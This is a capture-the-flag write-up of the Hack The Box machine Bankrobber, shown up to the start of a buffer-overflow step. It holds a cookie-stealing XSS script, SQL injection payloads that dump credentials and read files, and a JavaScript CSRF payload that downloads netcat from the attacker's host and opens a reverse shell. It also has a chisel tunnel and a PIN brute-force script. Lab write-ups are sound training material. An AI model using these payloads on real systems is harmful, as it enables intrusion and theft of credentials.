
#XSS #SQLI #Tunnel #bof
# Reconnaissance
```bash
# Automatic tools
# nmapAutomator (https://github.com/21y4d/nmapAutomator)
sudo nmapAutomator.sh --host 10.10.10.154 --type All
# Manually
nmap -sV -sC -A 10.10.10.154 -Pn 
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ nmap -sV -sC -A 10.10.10.154 -Pn 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 23:56 CST
Nmap scan report for 10.10.10.154
Host is up (0.31s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_ssl-date: TLS randomness does not represent time
|_http-title: Bad request!
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-08T15:56:42
|_  start_date: 2022-09-08T15:49:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.79 seconds

```

# Enumeration

## 80/tcp

### Feroxbuster

```bash
feroxbuster -u http://10.10.10.154/ -e
```

 nothing interested.

### HTTP Page

Notice that a login page for bitcoin page.

![[Bankrobber-01.png]]

and we will find `Copyright ©2022 All rights reserved | This template is made with by Colorlib`  and this page was made with colorlib, so let's search this exploit but no results.

```bash
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ searchsploit colorlib          
Exploits: No Results
Shellcodes: No Results
```

And we register on `test:test` to this page and login it:

![[Bankrobber-02.png]]

and there are transfer E-Coin function:

![[Bankrobber-03.png]]

![[Bankrobber-04.png]]

From `Transfer on hold. An admin will review it within a minute.After that he will decide whether the transaction will be dropped or not.`   notice that admin will check this content which could be used xss attacks.

Then we use burpsuite.

![[Bankrobber-05.png]]

```http
POST /user/transfer.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 34
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/user/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=3; username=dGVzdA%3D%3D; password=dGVzdA%3D%3D
Connection: close

fromId=3&toId=1&amount=1&comment=1
```

Let's try alter the content of `comment`, and we will know the id=3, notice id 1 and id 2 may be already existed. And the username and password are found to be base64 encoded cookies.

I’ll test XSS in the comment field, and start my Python http server. I’ll start simple, with a couple tags to see if they connect back to me:

```bash
python3 -m http.server 80
```

```
<img src="10.10.14.5/test.jpg" /> <script src="http://10.10.14.5/test.js"></script>
```

![[Bankrobber-06.png]]

![[Bankrobber-07.png]]

Perfect. It’s a bit off that the server is allowing plain script injection, but somehow isn’t loading images (hence the request for `test.js` and not `test.jpg`), but that is more likely an imperfection in the box author’s automation.

# Exploitation
## XSS attack
### cookie.js script

I’ll write a `cookie.js` with the following Javascript:

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.5/?test='+document.cookie, true);
request.send()
```

Now I’ll submit again, this time with `cookie.js` in the `src`. Some number of submits and some minutes later:

```
<img src="10.10.14.5/test.jpg" /> <script src="http://10.10.14.5/cookie.js"></script>
```

![[Bankrobber-08.png]]

![[Bankrobber-09.png]]

```bash
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [15/Sep/2022 16:20:39] "GET /cookie.js HTTP/1.1" 200 -
10.10.10.154 - - [15/Sep/2022 16:20:39] "GET /?test=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
10.10.10.154 - - [15/Sep/2022 16:22:07] "GET /cookie.js HTTP/1.1" 200 -

```
As I’ve seen that the cookies hold the username and password, I decode them (`%3D` will be `=`):

```bash
echo YWRtaW4= | base64 -d
echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ echo YWRtaW4= | base64 -d
admin                                                                                                                                                                                
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
Hopelessromantic
```

Excellent! we get the admin password `Hopelessromantic`. And we relogin.

## admin portal


![[Bankrobber-10.png]]

### Backdoorchecker
![[Bankrobber-11.png]]

![[Bankrobber-29.png]]

we will find it will be a `/admin/backdoorchecker.php` file in the admin folder.

### Search Users Function

![[Bankrobber-12.png]]

![[Bankrobber-13.png]]

#### SQLi attack

##### sqlmap

we save the search users http POST with burpsuite to search.req:

![[Bankrobber-19.png]]


```bash
sqlmap -r search.req --dbms mysql --technique=U --dump -v
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ sqlmap -r search.req --dbms mysql --technique=U --dump -v
        ___
       __H__                                                                                                                                                                    
 ___ ___[)]_____ ___ ___  {1.6.4#stable}                                                                                                                                        
|_ -| . [']     | .'| . |                                                                                                                                                       
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                       
      |_|V...       |_|   https://sqlmap.org                                                                                                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:33:21 /2022-09-15/

[18:33:21] [INFO] parsing HTTP request from 'search.req'
[18:33:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: term=1' UNION ALL SELECT NULL,CONCAT(0x71627a7071,0x647277766c777453446341626453416975694f58504d6b6f616a7a6c4e7741744652574d7371524b,0x7162627671),NULL-- -
---
[18:33:22] [INFO] testing MySQL
[18:33:22] [INFO] confirming MySQL
[18:33:27] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.4, Apache 2.4.39
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[18:33:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:33:27] [INFO] fetching current database
[18:33:28] [INFO] fetching tables for database: 'bankrobber'
[18:33:30] [INFO] fetching columns for table 'users' in database 'bankrobber'
[18:33:32] [INFO] fetching entries for table 'users' in database 'bankrobber'
Database: bankrobber
Table: users
[3 entries]
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | Hopelessromantic | admin    |
| 2  | gio              | gio      |
| 3  | test             | test     |
+----+------------------+----------+

[18:33:32] [INFO] table 'bankrobber.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.10.154/dump/bankrobber/users.csv'
[18:33:32] [INFO] fetching columns for table 'balance' in database 'bankrobber'
[18:33:33] [INFO] fetching entries for table 'balance' in database 'bankrobber'
Database: bankrobber
Table: balance
[11 entries]
+----+--------+--------+
| id | userid | amount |
+----+--------+--------+
| 1  | 2      | 35     |
| 2  | 3      | 990    |
| 6  | 4      | 2048   |
| 7  | 5      | 1000   |
| 8  | 6      | 1000   |
| 9  | 7      | 1000   |
| 10 | 8      | 1000   |
| 11 | 9      | 1000   |
| 12 | 5      | 1000   |
| 13 | 6      | 1000   |
| 14 | 3      | 1000   |
+----+--------+--------+

[18:33:35] [INFO] table 'bankrobber.balance' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.10.154/dump/bankrobber/balance.csv'
[18:33:35] [INFO] fetching columns for table 'hold' in database 'bankrobber'
[18:33:36] [INFO] fetching entries for table 'hold' in database 'bankrobber'
[18:33:36] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[18:33:47] [WARNING] unable to retrieve the entries for table 'hold' in database 'bankrobber'
[18:33:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.154'

[*] ending @ 18:33:47 /2022-09-15/

```

##### Manually

###### MySQL SQL Injection Cheat Sheet
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

###### notes.txt

we could access this contents on the admin portal : `http://10.10.10.154/notes.txt`

```txt
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

![[Bankrobber-22.png]]

###### UNION injection
On playing with the users search, I quickly identified a potential SQLI:

```sql
1'
```

![[Bankrobber-14.png]]

Now I can access a lot of stuff. First, all the users:

```sql
1' or 1=1-- -
```

![[Bankrobber-15.png]]

Now I’ll try for a `UNION` injection. I’ll need to know how many columns. `SELECT 1` and `SELECT 1,2` returns errors, but `1,2,3` works:

```sql
1' UNION SELECT 1;-- -
1' UNION SELECT 1,2;-- -
1' UNION SELECT 1,2,3;-- -
```

![[Bankrobber-16.png]]

![[Bankrobber-17.png]]

![[Bankrobber-18.png]]

There are three columns, and the value in 1 `ID` and 2 `User` are returned to me. I can get the version and current user:

*version*

```sql
1' UNION SELECT 1,@@version,3;-- -
```

![[Bankrobber-20.png]]

*User*

```sql
1' UNION SELECT 1,system_user(),3;-- -
```

![[Bankrobber-21.png]]


*Check password*

```sql
1' UNION SELECT user,password,3 from mysql.user;-- -
```

![[Bankrobber-24.png]]

we will know the root password hash is:

```txt
*F435725A173757E57BD36B09048B8B610FF4D0C4
```

*Data Directory*

```sql
1' UNION SELECT 1,@@datadir,3;-- -
```

![[Bankrobber-23.png]]

we will get `C:\xampp\mysql\data\` will be database directory.

*Load File*

index.php
```sql
1' UNION SELECT 1,LOAD_FILE('c:\\xampp\\htdocs\\index.php'),3;-- -
```

![[Bankrobber-25.png]]

```php
<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		
		<tr>
		    <td>1</td>
		    <td><?php
error_reporting(0);
$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));

if(!empty($username) && !empty($password)){
	$redir = "user";
	if($username == "admin"){
		$redir = "admin";
	}
	header('Location: '.$redir);
}
?>

<!DOCTYPE html>
<html lang="zxx" class="no-js">
<head>
	<!-- Mobile Specific Meta -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<!-- Favicon-->
	<link rel="shortcut icon" href="img/fav.png">
	<!-- Author Meta -->
	<meta name="author" content="codepixer">
	<!-- Meta Description -->
	<meta name="description" content="">
	<!-- Meta Keyword -->
	<meta name="keywords" content="">
	<!-- meta character set -->
	<meta charset="UTF-8">
	<!-- Site Title -->
	<title>E-coin</title>

	<link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet"> 
		<!--
		CSS
		============================================= -->
		<link rel="stylesheet" href="css/linearicons.css">
		<link rel="stylesheet" href="css/font-awesome.min.css">
		<link rel="stylesheet" href="css/bootstrap.css">
		<link rel="stylesheet" href="css/magnific-popup.css">
		<link rel="stylesheet" href="css/nice-select.css">					
		<link rel="stylesheet" href="css/animate.min.css">
		<link rel="stylesheet" href="css/owl.carousel.css">
		<link rel="stylesheet" href="css/main.css">
	</head>
	<body>

		  <header id="header" id="home">
		    <div class="container">
		    	<div class="row align-items-center justify-content-between d-flex">
			      <div id="logo">
			        <a href="index.html"><img src="img/logo.png" alt="" title="" /></a>
			      </div>
			      <nav id="nav-menu-container">
			        <ul class="nav-menu">
			          <li><a href="#convert">Login</a></li>
			          <li><a href="#price">Register</a></li>
			        </ul>
			      </nav><!-- #nav-menu-container -->		    		
		    	</div>
		    </div>
		  </header><!-- #header -->

		<section class="banner-area relative" id="home">
			<div class="overlay overlay-bg"></div>		
			<div class="container">
				<div class="row fullscreen d-flex align-items-center justify-content-start">
					<div class="banner-content col-lg-12 col-md-12">
						<?php if(isset($_GET['msg'])){echo htmlentities($_GET['msg'])."<hr>";}?>
						<h5 class="text-white text-uppercase">Currently Purchase Rate</h5>
						<h1 class="text-uppercase">
							$1337					
						</h1>
						<p class="text-white pt-20 pb-20">
							E-coin is adecentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third-party interference.
						</p>
						<a href="#" class="primary-btn header-btn text-uppercase">Buy E-coin</a>
					</div>												
				</div>
			</div>
		</section>
		<!-- End banner Area -->	

		<!-- Start register Area -->
		<section class="convert-area" id="convert">
			<div class="container">
				<div class="convert-wrap">
					<div class="row justify-content-center align-items-center flex-column pb-30">
						<h1 class="text-white">Login</h1>
						<p class="text-white">Here you can login to your account.</p>							
					</div>
					<div class="row justify-content-center align-items-start">
						<div class="col-lg-2 cols-img">
							<img class="d-block mx-auto" src="img/bitcoin.png" alt="">
						</div>
						<div class="col-lg-3 cols">
							<form method="POST" action="login.php">
								<input type="text" name="username" placeholder="Username" class="form-control mb-20">
								<input type="password" name="password" placeholder="Password" class="form-control mb-20">
								<input type="submit" name="pounds" placeholder="pounds" class="form-control mb-20">
							</form>
						</div>
						
					</div>						
				</div>
			</div>	
		</section>
		<!-- End register Area -->
		
		<section class="convert-area" id="price">
			<div class="container">
				<div class="convert-wrap">
					<div class="row justify-content-center align-items-center flex-column pb-30">
						<h1 class="text-white">Register</h1>
						<p class="text-white">Here you can create an account</p>							
					</div>
					<div class="row justify-content-center align-items-start">
						<div class="col-lg-2 cols-img">
							<img class="d-block mx-auto" src="img/bitcoin.png" alt="">
						</div>
						<div class="col-lg-3 cols">
							<form action="register.php" method="POST">
								<input type="text" name="username" placeholder="Username" class="form-control mb-20">
								<input type="text" name="password" placeholder="Password" class="form-control mb-20">
								<input type="submit" name="pounds" placeholder="pounds" class="form-control mb-20">
							</form>
						</div>
						
					</div>						
				</div>
			</div>	
		</section>
		

		<!-- start footer Area -->		
		<footer class="footer-area section-gap">
			<div class="container">
				<div class="row">
					<div class="col-lg-3  col-md-6 col-sm-6">
						<div class="single-footer-widget">
							<h4 class="text-white">About Us</h4>
							<p>
								We are a new startup company focussing on crypto-coins.
							</p>
						</div>
					</div>
					<div class="col-lg-3  col-md-6 col-sm-6">
						<div class="single-footer-widget">
							<h4 class="text-white">Top Products</h4>
							<ul class="footer-menu">
								<a href="https://twitter.com/cneelis"><i class="fa fa-twitter"></i></a>
								<a href="https://twitter.com/giovannichhatta"><i class="fa fa-twitter"></i></a>
							</ul>
						</div>
					</div>						
					<div class="col-lg-6  col-md-6 col-sm-6">
						<div class="single-footer-widget">
							<h4 class="text-white">Newsletter</h4>
							<p>You can trust us. we only send  offers, not a single spam.</p>
							<div class="d-flex flex-row" id="mc_embed_signup">
								  <form class="navbar-form" novalidate="true" action="#" method="get">
								    <div class="input-group add-on">
								      	<input class="form-control" name="EMAIL" placeholder="Email address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Email address'" required="" type="email">
										<div style="position: absolute; left: -5000px;">
											<input name="b_36c4fd991d266f23781ded980_aefe40901a" tabindex="-1" value="" type="text">
										</div>
								      <div class="input-group-btn">
								        <button class="genric-btn"><span class="lnr lnr-arrow-right"></span></button>
								      </div>
								    </div>
								      <div class="info mt-20"></div>									    
								  </form>
							</div>
						</div>
					</div>						
				</div>
				<div class="footer-bottom d-flex justify-content-between align-items-center flex-wrap">
					<p class="footer-text m-0">
						<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
					</p>
					<div class="footer-social d-flex align-items-center">
						<a href="https://twitter.com/cneelis"><i class="fa fa-twitter"></i></a>
						<a href="https://twitter.com/giovannichhatta"><i class="fa fa-twitter"></i></a>
					</div>
				</div>
			</div>
		</footer>	
		<!-- End footer Area -->

		<script src="js/vendor/jquery-2.2.4.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<script src="js/vendor/bootstrap.min.js"></script>			
		<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBhOdIF3Y9382fqJYt5I_sswSrEw5eihAA"></script>
			<script src="js/easing.min.js"></script>			
		<script src="js/hoverIntent.js"></script>
		<script src="js/superfish.min.js"></script>	
		<script src="js/jquery.ajaxchimp.min.js"></script>
		<script src="js/jquery.magnific-popup.min.js"></script>	
		<script src="js/owl.carousel.min.js"></script>			
		<script src="js/jquery.sticky.js"></script>
		<script src="js/jquery.nice-select.min.js"></script>			
		<script src="js/parallax.min.js"></script>	
		<script src="js/waypoints.min.js"></script>
		<script src="js/jquery.counterup.min.js"></script>			
		<script src="js/mail-script.js"></script>	
		<script src="js/main.js"></script>	
	</body>
</html>



</td>
		 </tr>
		</table>
```

 backdoorchecker.php

```sql
1' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -
```

```php
<table width='90%'><tr><th>ID</th><th>User</th></tr>
		<tr>
		    <td>1</td>
		    <td>admin</td>
		 </tr>
		
		<tr>
		    <td>1</td>
		    <td><?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?></td>
		 </tr>
		</table>
```

To use this function, my cookies must show the I’m admin with the correct hardcoded password. Next, it checks the command for `$(` and `&`, and fails if either are present. Next, as this is a Windows host, it checks that the first three characters of the command are `dir`. Finally, it checks that the remote address (the source of the request) is localhost, and if so, passes it to `system`.

### XSS + XSRF = Shell

I can easily escape the initial filters to run whatever I want using `;` or `|` to chain additional commands to `dir`. I need to figure out how to send my request from localhost.

This is where I can use the XSS. In a real life scenario, this server likely wouldn’t be restricting access to localhost, but rather the internal network, or even just the admin subnet of that network. And the admin wouldn’t be checking the submissions from the server, but from a box that would likely be able to submit to backdoorchecker. But I’ll hypothesize that in this case, the admin user is on Bankrobber, and thus can submit requests to backdoorchecker from there.

I’ll craft a Javascript payload that will issue the request to `/admin/backdoorchecker.php`, and call it `shell.js`:

```js
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```

This will get the admin user to make a request for me, which is a Cross-Site Request Forgery (XSRF) attack.

I’ll submit the XSS payload to get `shell.js` through my logged in user test, and wait for the payload to fire.:

```
<script src="http://10.10.14.5/shell.js"></script>
```

![[Bankrobber-26.png]]

When it does, I’ll see a GET for `shell.js`, which will run, and issuing a POST to `/admin/backdoorchecker.php` with the parameters `cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443`. This will pass all the checks in `backdoorchecker.php`, and pass that on to `system`, which will run the `dir`, followed by the `powershell` to download `nc64.exe` from my server, save it in `%temp%`. Then my commands have it run `nc` to connect back to me with a shell.

```bash
nc -lnvp 443
```

![[Bankrobber-27.png]]

```bash
whoami
type C:\Users\Cortin\Desktop\user.txt
# flag
f635346600876a43441cf1c6e94769ac
```

![[Bankrobber-28.png]]


# Privilege Escalation

## Enumeration

The only thing I really found of interest on the filesystem was a binary at the drive root, `bankv2.exe`:

```bash
cd C:\
dir
icacls bankv2.exe
```

```txt
C:\xampp\htdocs\admin>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BC8D-2AD7

 Directory of C:\

25-04-2019  16:50            57.937 bankv2.exe
24-04-2019  21:27    <DIR>          PerfLogs
11-01-2021  15:17    <DIR>          Program Files
11-01-2021  15:31    <DIR>          Program Files (x86)
24-04-2019  15:52    <DIR>          Users
11-01-2021  15:17    <DIR>          Windows
24-04-2019  21:18    <DIR>          xampp
               1 File(s)         57.937 bytes
               6 Dir(s)   8.500.064.256 bytes free

C:\>icacls bankv2.exe
icacls bankv2.exe
bankv2.exe: Toegang geweigerd.
Successfully processed 0 files; Failed processing 1 files

```

Google Translate tells me “Toegang geweigerd.” is “Access denied.” in Dutch.

After looking around the filesystem and not finding much, I eventually checked the `netstat` for listening ports:

```bash
netstat -ano | findstr LISTENING
```

```txt
C:\>netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2772
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2772
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1620
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1764
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       464
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1456
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       592
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       2772
  TCP    [::]:135               [::]:0                 LISTENING       736
  TCP    [::]:443               [::]:0                 LISTENING       2772
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       1764
  TCP    [::]:49664             [::]:0                 LISTENING       464
  TCP    [::]:49665             [::]:0                 LISTENING       916
  TCP    [::]:49666             [::]:0                 LISTENING       892
  TCP    [::]:49667             [::]:0                 LISTENING       1456
  TCP    [::]:49668             [::]:0                 LISTENING       592
  TCP    [::]:49669             [::]:0                 LISTENING       600

```

910 jumped out at me as something I hadn’t seen in my initial `nmap`. It’s running with PID 1488, which is `bankv2.exe`:

```bash
tasklist
```

```txt
C:\>tasklist
tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          4 K
System                           4                            0        140 K
smss.exe                       288                            0      1.180 K
csrss.exe                      360                            0      8.316 K
wininit.exe                    464                            0      5.268 K
csrss.exe                      472                            1      4.076 K
winlogon.exe                   540                            1     15.564 K
services.exe                   592                            0      6.840 K
lsass.exe                      600                            0     13.184 K
svchost.exe                    684                            0     14.688 K
svchost.exe                    736                            0      9.000 K
dwm.exe                        836                            1     35.956 K
svchost.exe                    892                            0     45.932 K
svchost.exe                    916                            0     16.256 K
svchost.exe                    924                            0     25.424 K
svchost.exe                    988                            0     15.748 K
svchost.exe                    352                            0     16.532 K
svchost.exe                    960                            0     16.572 K
vm3dservice.exe               1028                            0      6.012 K
svchost.exe                   1244                            0      7.912 K
svchost.exe                   1340                            0      7.104 K
spoolsv.exe                   1456                            0     15.424 K
bankv2.exe                    1620                            0        112 K
xampp-control.exe             1796                            0      2.512 K
svchost.exe                   1908                            0     20.600 K
svchost.exe                   2012                            0      8.384 K
vmtoolsd.exe                  1140                            0     22.884 K
VGAuthService.exe             1168                            0     10.584 K
Memory Compression            1648                            0          8 K
dllhost.exe                   2428                            0     13.004 K
WmiPrvSE.exe                  2516                            0     19.764 K
msdtc.exe                     2608                            0     10.096 K
LogonUI.exe                   2796                            1     54.440 K
SearchIndexer.exe             2852                            0     31.156 K
conhost.exe                   2744                            0        560 K
httpd.exe                     2772                            0         32 K
conhost.exe                   2708                            0         44 K
mysqld.exe                    1764                            0     14.428 K
conhost.exe                   1684                            0        112 K
httpd.exe                     3152                            0      6.948 K
svchost.exe                   4032                            0      7.056 K
sedsvc.exe                    3068                            0     10.640 K
svchost.exe                   3860                            0      8.304 K
cmd.exe                       4732                            0      1.604 K
conhost.exe                   3836                            0      1.088 K
powershell.exe                3020                            0      2.808 K
n.exe                         4192                            0      2.616 K
cmd.exe                       4328                            0      2.204 K
svchost.exe                   4636                            0      6.788 K
SearchProtocolHost.exe        1652                            0     10.900 K
SearchFilterHost.exe          2000                            0      6.316 K
dllhost.exe                   4224                            0      5.808 K
tasklist.exe                  1304                            0      7.792 K

```

I can use `nc` that I uploaded to talk to this port. When I connected, it hung for a moment, but when I hit enter, it continued:

```bash
%temp%\n.exe 127.0.0.1 910
```

When I enter a pin at random, I get denied:

```cmd
C:\>%temp%\n.exe 127.0.0.1 910
%temp%\n.exe 127.0.0.1 910
1234
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1234


```

We'll have to forward this port in order to access it, because the firewall blocks direct connections to it. This can be achieved by using chisel. Download the Windows and Linux binaries from the releases section.

### Tunnel

I’m going to script a brute force attack on the pin, but I don’t want to do that from Windows. I’ll create a tunnel using `chisel` (I’ve written a [post](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) about the awesomeness that is [Chisel](https://github.com/jpillora/chisel) before). With a copy of the amd65 compiled binary from the [release page](https://github.com/jpillora/chisel/releases) in my webserver directory, I’ll get it on Bankrobber in cortin’s temp directory:

```bash
# kali
# install chisel
sudo apt-get install chisel
gunzip chisel_1.7.7_windows_amd64.gz
mv chisel_1.7.7_windows_amd64 chisel_windows_amd64.exe
```

```powershell
# rhost
cd C:\Users\Cortin\AppData\Local\Temp
powershell -c "wget 10.10.14.5/chisel_windows_amd64.exe -o c.exe"
```

```bash
# kali
chisel server -p 8000 --reverse
```

Now `chisel` is listening on 8000, and will allow reverse tunnels, which is what I’ll create next:

```cmd
c.exe client 10.10.14.5:8000 R:910:localhost:910
```

This will create a listener on my local box on port 910, which will forward traffic through chisel to localhost on Bankrobber port 910.

![[Bankrobber-30.png]]

And I can test the tunnel with `nc`:

```bash
nc localhost 910
```

![[Bankrobber-31.png]]

Very Nice.

### Brute Force Pin

I’ll write a Python script to brute force the pin. It will use `socket` to connect to localhost:910, send the pin and a newline, and check for “Access denied” in the response. If it’s not there, It will print the pin and break. To make it a bit neater, I’ll add a line that prints the current number being tried, overwriting itself each time to not flood my screen:

```bash
vim bruteforce.py
```

```python
#!/usr/bin/env python3

import socket
import sys


for i in range(10000):
    sys.stdout.write(f"\rTrying: {i:04d}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 910))
    s.recv(4096)
    s.send(f"{i:04d}\n".encode())
    resp = s.recv(4096)
    if not b"Access denied" in resp:
        print(f"\rFound pin: {i:04d}")
        break
    s.close()
```

```bash
python3 bruteforce.py
```

![[Bankrobber-32.png]]

And we will found pin 0021.

### Overflow

Now with the pin, I can look at the rest of the app:

```bash
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1234
 [$] Transfering $1234 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
